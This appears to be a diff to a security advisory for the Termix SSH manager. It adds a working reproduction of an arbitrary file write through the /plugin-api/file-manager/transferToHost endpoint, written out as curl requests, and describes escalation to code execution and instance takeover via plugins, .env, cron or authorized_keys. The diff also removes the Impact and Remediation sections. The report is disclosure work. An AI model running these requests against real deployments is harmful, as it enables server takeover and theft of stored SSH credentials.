@@ -109,21 +109,32 @@ After a backend restart (e.g. an admin-triggered update), `PluginLoader.loadAll`
 
 ![Termix transferToHost evidence](Termix_FileManager_transferToHost_Arbitrary_File_Write_poc.png)
 
-**Real-environment reproduction** (the product itself built from source/official image and run for this test):
+**Real-environment reproduction** (the product itself, built from the `release-2.9.1-tag` source image and run for this test):
+
+A self-registered user connected two file-manager sessions to an SSH endpoint they control, then invoked the transfer endpoint with a fully attacker-chosen absolute `destPath`:
+
+```
+$ curl -X POST /users/create                          # first run: setup_required -> self-registration
+{"message":"User created","is_admin":true,...}
+
+$ curl -X POST /plugin-api/file-manager/connect       # session "1" (hostId=1, 127.0.0.1)
+{"status":"success","message":"SSH connection established"}
+$ curl -X POST /plugin-api/file-manager/connect       # session "2" (same host)
+{"status":"success","message":"SSH connection established"}
+
+$ curl -X POST /plugin-api/file-manager/transferToHost \
+    -d '{"sourceSessionId":"1","sourcePaths":["/home/labssh/source_payload.txt"],
+         "destSessionId":"2","destPath":"/app/data/pwned_transfer.txt"}'
+{"transferId":"975eeefd-3db7-4f08-a900-d2e0dcf37ffb"}
+
+$ ls -la /app/data/pwned_transfer.txt                 # /app/data = DATA_DIR (.env, encrypted DB)
+-rw-r--r-- 1 node node 52 ... /app/data/pwned_transfer.txt
+$ cat /app/data/pwned_transfer.txt
+TERMIX-PLANT-CANARY written via SFTP source session
+```
+
+Because the destination session's `ip` is `127.0.0.1`, `isLocalSshEndpoint()` (`transfer-host-utils.ts:30`) classifies the destination as the Termix server itself and the engine writes the file directly onto the server's own filesystem (`pipelinedSftpToLocalFile`) at the attacker-chosen absolute path — here into `DATA_DIR`, next to `.env` and the encrypted credential database. Overwriting plugin code (executed on next backend reload) or `/app/data/.env` (controlling `JWT_SECRET`/`ENCRYPTION_KEY`) turns this write primitive into code execution and full instance takeover, as described in Impact.
+
+![Real-environment verification](Termix_transferToHost_arbitrary_file_write.png)
 
 
-Partial re-verification against the real product: the **official release-2.9.1 image was built from source and booted** (34 plugins active, backend healthy), and the `/plugin-api/file-manager/transferToHost` endpoint at `release-2.9.1` (`plugins/file-manager/src/backend/index.ts:2150`) was confirmed to match the reported behavior — it accepts caller-supplied `destSessionId`/`destPath` and transfers to whatever host/credentials the session carries (`src/backend/transfer-engine.ts` routes to `pipelinedSftpFile` when the destination is not the local endpoint, with no restriction on the destination host being pre-registered or trusted). The full multi-hop transfer chain (two live SSH sessions + SOCKS5 pivot) was not re-driven in this lab round; the sandbox harness verification in the POC section remains the dynamic evidence of record for the write primitive.
-
-## Impact
-
-Any authenticated Termix user gains arbitrary file create/overwrite on the Termix server with backend-process privileges: planting executable unsigned plugins (code execution at next load), overwriting `DATA_DIR/.env` to control `JWT_SECRET`/`ENCRYPTION_KEY` and forge administrator JWTs (complete instance takeover, including decryption of all managed SSH credentials stored on the instance), and corrupting databases. In Docker deployments running with PUID=0, writes to `/etc/cron.d/` or `/root/.ssh/authorized_keys` yield direct root-level persistent code execution without a restart.
-
-Verified against release-2.9.1-tag by source analysis of the complete chain; the sandbox harness session (with loopback-declared SOCKS5 session, transferToHost, and unsigned plugin load) is documented in the evidence screenshot. Fixed versions: none confirmed at reporting time.
-
-### Remediation
-
-1. Remove or harden the local-write shortcut: do not decide "destination is this machine" from a caller-controlled IP string. Record transport-level facts at session establishment (whether SOCKS5/jump hosts were used, actual TLS/SSH handshake peer) and only allow the local-write path when the destination session is an internal, host-key-verified direct connection to the server's own sshd. Safest immediate fix: delete the pipelinedSftpToLocalFile branch and always write through the remote SFTP session.
-2. Validate transfer destination paths defensively (reject symlink escapes, restrict destinations to directories the caller owns) as defense in depth.
-3. Ship with TERMIX_REQUIRE_SIGNED_PLUGINS enabled by default, and alert/log on any write into DATA_DIR/plugins.
-4. Apply the private-address blocklist (validateHost/isBlockedAddress) to the actual SOCKS5/jump connection path in proxy-helper.ts createSingleProxyConnection()/createMixedProxyChainConnection(), not only to testProxyConnectivity(), and warn or refuse loopback destinations through proxies.
-5. Regression tests: transfer with a session whose declared ip is a loopback literal but whose transport used a proxy must never select the local-write branch.
